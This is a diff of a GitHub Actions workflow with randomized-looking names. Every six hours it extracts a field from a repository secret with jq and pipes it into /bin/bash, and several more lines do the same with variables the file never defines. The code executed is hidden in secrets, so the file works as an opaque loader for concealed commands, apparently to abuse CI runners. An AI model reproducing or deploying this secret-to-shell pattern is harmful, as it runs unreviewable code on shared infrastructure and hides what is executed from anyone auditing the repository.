@@ -1,26 +1,22 @@
 name: yuanchengbag
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 4/6 * * *'
-jobs:  # 12740
+    - cron: '26 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yuanchengbag
         env:
-          cfczl1188: ${{ secrets.cfczl1188 }}
+          qcm601: ${{ secrets.qcm601 }}
         run: |
-          echo $cfczl1188 | jq -r .akrkf013 | /bin/bash
-          echo $t7386 | jq -r .kn3674 | /bin/bash
-          echo $f48 | jq -r .fm667 | /bin/bash
-          echo $jop2 | jq -r .yxqpk4 | /bin/bash
-          echo $rrprf169 | jq -r .s94631 | /bin/bash
-          echo $fug8 | jq -r .xflux4743 | /bin/bash
-          echo $w4 | jq -r .vg0903 | /bin/bash
-          echo $hu19 | jq -r .x25 | /bin/bash
-          echo $lh7 | jq -r .dlsmg6010 | /bin/bash
+          echo $qcm601 | jq -r .r37737 | /bin/bash
+          echo $xmpy1457 | jq -r .y217 | /bin/bash
+          echo $u057 | jq -r .b352 | /bin/bash
+          echo $xauk2 | jq -r .vq095 | /bin/bash
+          echo $q0966 | jq -r .nnj04229 | /bin/bash
+          echo $nkt90528 | jq -r .alqgo0981 | /bin/bash
+          echo $sqln5444 | jq -r .durej0 | /bin/bash
 
